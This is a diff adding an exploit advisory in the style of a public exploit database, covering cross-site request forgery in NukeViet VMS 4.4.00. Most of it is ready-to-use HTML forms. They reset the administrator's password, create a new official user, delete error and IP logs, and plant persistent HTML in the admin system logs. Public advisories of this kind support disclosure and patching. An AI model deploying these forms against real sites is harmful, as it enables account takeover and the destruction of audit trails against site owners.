@@ -1,0 +1,106 @@
+# Exploit Title: NukeViet VMS 4.4.00 - Cross-Site Request Forgery (Change Admin Password)
+# Date: 2020-05-18
+# Exploit Author: JEBARAJ
+# Vendor Homepage: https://nukeviet.vn/
+# Software Link: https://github.com/nukeviet/nukeviet/releases/download/4.4.00/nukeviet4.4.00setup.zip
+# Version: 4.4.00
+# Tested on: Windows 10 Pro
+# CVE : N/A
++---------------------------------------------------------------------------------------------------------------------------------------------------+
+
+Description:
+NukeViet CMS v4.4.00 suffer from Cross Site Request Forgery (CSRF) vulnerability.This Vulnerabilty lets attacker change profile details and password of the user without knowing thier old password. Create a new user with admin privileges. Delete Sensitive and other log files.
+
+1. Changing password of Admin user and thier profile details
+
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://localhost/nukeviet/admin/index.php?language=en&nv=users&op=edit&userid=1" method="POST">
+      <input type="hidden" name="username" value="admin" />
+      <input type="hidden" name="email" value="admin&#64;admin&#46;com" />
+      <input type="hidden" name="first&#95;name" value="admin" />
+      <input type="hidden" name="last&#95;name" value="" />
+      <input type="hidden" name="gender" value="N" />
+      <input type="hidden" name="birthday" value="07&#47;05&#47;1986" />
+      <input type="hidden" name="sig" value="" />
+      <input type="hidden" name="question" value="123" />
+      <input type="hidden" name="answer" value="1234" />
+      <input type="hidden" name="photo" value="" />
+      <input type="hidden" name="group&#95;default" value="1" />
+      <input type="hidden" name="password1" value="Admin123456" />
+      <input type="hidden" name="password2" value="Admin123456" />
+      <input type="hidden" name="confirm" value="1" />
+      <input type="hidden" name="nv&#95;redirect" value="" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+2. Create new user.
+
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://localhost/nukeviet/admin/index.php?language=en&nv=users&op=user_add" method="POST">
+      <input type="hidden" name="username" value="aaaaa" />
+      <input type="hidden" name="email" value="aaaaaaa&#64;aaaaaaaaaa&#46;com" />
+      <input type="hidden" name="password1" value="VeK8hsRYn9TRk7z" />
+      <input type="hidden" name="password2" value="VeK8hsRYn9TRk7z" />
+      <input type="hidden" name="first&#95;name" value="asdf" />
+      <input type="hidden" name="last&#95;name" value="asdf" />
+      <input type="hidden" name="gender" value="M" />
+      <input type="hidden" name="birthday" value="01&#47;05&#47;1994" />
+      <input type="hidden" name="sig" value="" />
+      <input type="hidden" name="question" value="asdf" />
+      <input type="hidden" name="answer" value="asdf" />
+      <input type="hidden" name="photo" value="" />
+      <input type="hidden" name="is&#95;official" value="1" />
+      <input type="hidden" name="is&#95;email&#95;verified" value="1" />
+      <input type="hidden" name="confirm" value="1" />
+      <input type="hidden" name="nv&#95;redirect" value="" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+
+
+3. Deleting Log files
+
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://localhost/nukeviet/admin/index.php?language=en&nv=webtools&op=clearsystem" method="POST">
+      <input type="hidden" name="check&#95;all&#91;&#93;" value="yes" />
+      <input type="hidden" name="submit" value="Submit" />
+      <input type="hidden" name="deltype&#91;&#93;" value="clearcache" />
+      <input type="hidden" name="deltype&#91;&#93;" value="clearfiletemp" />
+      <input type="hidden" name="deltype&#91;&#93;" value="clearerrorlogs" />
+      <input type="hidden" name="deltype&#91;&#93;" value="clearip&#95;logs" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+Persistent HTML injection via CSRF
+
+Since the application has xss protection header it is hard to get an XSS. HTML injection is possible via unsanitized parameter passed to database and then displayed in Informations -> system logs tab on admin panel.
+
+Vulnerable Source code:
+clearsystem.php -> line 58 
+nv_insert_logs(NV_LANG_DATA, $module_name, $lang_module['clearsystem'], implode(", ", $deltype), $admin_info['userid']);
+
+There are many instances like this triggering to html injection.
+
+P0c: htmlinjection.html
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://localhost/nukeviet/admin/index.php?language=en&nv=webtools&op=clearsystem" method="POST">
+      <input type="hidden" name="submit" value="Submit" />
+      <input type="hidden" name="deltype&#91;&#93;" value="test&#58;<input&#32;type&#61;"text"&#47;>" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
